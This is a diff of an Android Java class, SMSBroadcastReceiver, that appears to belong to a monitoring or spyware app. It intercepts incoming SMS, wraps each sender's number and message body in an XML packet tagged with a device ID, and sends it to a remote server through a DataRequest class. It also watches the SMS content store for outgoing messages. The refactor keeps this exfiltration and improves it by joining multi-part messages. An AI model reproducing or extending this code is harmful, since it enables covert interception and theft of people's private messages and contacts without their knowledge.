@@ -15,20 +15,20 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.inet.android.bs.FileLog;
-import com.inet.android.bs.Request;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.bs.RequestMakerImpl;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private static final String TAG = "SMS";
-	private static final Uri STATUS_URI = Uri.parse("content://sms");
 	private SmsSentObserver smsSentObserver = null;
 	String str = "";
 	SharedPreferences sp;
 	private Context mContext;
 	private Bundle mBundle;
 	String dir = null;
-	Request req;
+	RequestMakerImpl req;
 
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
@@ -36,35 +36,25 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		String sms = sp.getString("KBD", "0");
 
 		if (sms.equals("0")) {
-			Log.d(TAG, "KBD = 0");
-			FileLog.writeLog("sms: KBD = 0");
+			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
 			return;
 		}
 
 		boolean isWork = WorkTimeDefiner.isDoWork(context);
 		if (!isWork) {
-			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
-			Log.d(TAG, "after isWork retrun 0");
-			FileLog.writeLog("sms: isWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("sms: after isWork retrun 0");
+			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
+					"isWork return " + Boolean.toString(isWork));
 
 			return;
 		} else {
-			Log.d(TAG, Boolean.toString(isWork));
-			FileLog.writeLog("sms: " + Boolean.toString(isWork));
+			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
 		}
 		try {
 			mContext = context;
 			mBundle = intent.getExtras();
 			// smsSentObserver = null;
 			Log.d(TAG, "Intent Action : " + intent.getAction());
-			Object[] pdus = (Object[]) mBundle.get("pdus");
-			if (pdus != null) {
-				getSMSDetails();
-			} else {
-				Log.e(TAG, "Bundle is Empty!");
-				FileLog.writeLog("sms: Bundle is Empty!");
-			}
+			getSMSDetails();
 
 			if (smsSentObserver == null) {
 				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
@@ -72,38 +62,24 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 						Uri.parse("content://sms"), true, smsSentObserver);
 			}
 		} catch (Exception sgh) {
-			Log.e(TAG, "Error in Init : " + sgh.toString());
-			FileLog.writeLog("sms: Error in Init : " + sgh.toString());
+			Logging.doLog(TAG, "Error in Init : " + sgh.toString(), "Error in Init : " + sgh.toString());
 		}
 	}
 
 	@SuppressLint("SimpleDateFormat")
-	@SuppressWarnings("deprecation")
 	private void getSMSDetails() {
 		SmsMessage[] msgs = null;
-		dir = "вх. Sms";
+
 		try {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
+				dir = "вх. Sms";
 				msgs = new SmsMessage[pdus.length];
 
-				Log.d(TAG, "pdus length : " + pdus.length);
-				FileLog.writeLog("sms: pdus length : " + pdus.length);
-
-				SmsMessage messages = SmsMessage
-						.createFromPdu((byte[]) pdus[0]);
-				str += String.format("SMS from %s:%s\n", messages
-						.getOriginatingAddress(), messages.getMessageBody()
-						.toString());
-
-				Log.d("sms", str + logTime());
-				FileLog.writeLog("sms: " + str + logTime());
-
-				// Toast toast = Toast.makeText(mContext, str + logTime(),
-				// Toast.LENGTH_SHORT);
-				// toast.show();
+				StringBuilder bodyText = new StringBuilder();
 				for (int k = 0; k < msgs.length; k++) {
 					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);
+
 					Log.d(TAG,
 							"getDisplayMessageBody : "
 									+ msgs[k].getDisplayMessageBody());
@@ -114,29 +90,31 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 					Log.d(TAG,
 							"getOriginatingAddress : "
 									+ msgs[k].getOriginatingAddress());
-					Log.d(TAG,
-							"getProtocolIdentifier : "
-									+ msgs[k].getProtocolIdentifier());
-					Log.d(TAG, "getStatus : " + msgs[k].getStatus());
-					Log.d(TAG, "getStatusOnIcc : " + msgs[k].getStatusOnIcc());
-					Log.d(TAG, "getStatusOnSim : " + msgs[k].getStatusOnSim());
-					// -------send sms--------------------------------
-					String sendStr = "<packet><id>" + sp.getString("ID", "ID")
-							+ "</id><time>" + logTime()
-							+ "</time><type>4</type><app>" + dir
-							+ "</app><ttl>" + msgs[k].getOriginatingAddress()
-							+ "</ttl><cdata1>" + msgs[k].getMessageBody()
-							+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
-
-					req = new Request(mContext);
-					req.sendRequest(sendStr);
-					Log.d("smsRec", sendStr);
-					FileLog.writeLog("sms: " + sendStr);
+				
 				}
+				String adress = msgs[0].getOriginatingAddress();
+
+				for (int i = 0; i < msgs.length; i++) {
+					bodyText.append(msgs[i].getMessageBody());
+				}
+				// -------send sms--------------------------------
+				String sendStr = "<packet><id>" + sp.getString("ID", "ID")
+						+ "</id><time>" + logTime()
+						+ "</time><type>4</type><app>" + dir + "</app><ttl>"
+						+ adress + "</ttl><cdata1>" + bodyText.toString()
+						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
+
+//				req = new RequestMakerImpl(mContext);
+//				req.sendDataRequest(sendStr);
+				
+				DataRequest dr = new DataRequest(mContext);
+				dr.sendRequest(sendStr);
+				
+				Logging.doLog(TAG, sendStr, sendStr);
+
 			}
 		} catch (Exception sfgh) {
-			Log.e(TAG, "Error in getSMSDetails : " + sfgh.toString());
-			FileLog.writeLog("sms: Error in getSMSDetails : " + sfgh.toString());
+			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(), "Error in getSMSDetails : " + sfgh.toString());
 		}
 	}
 
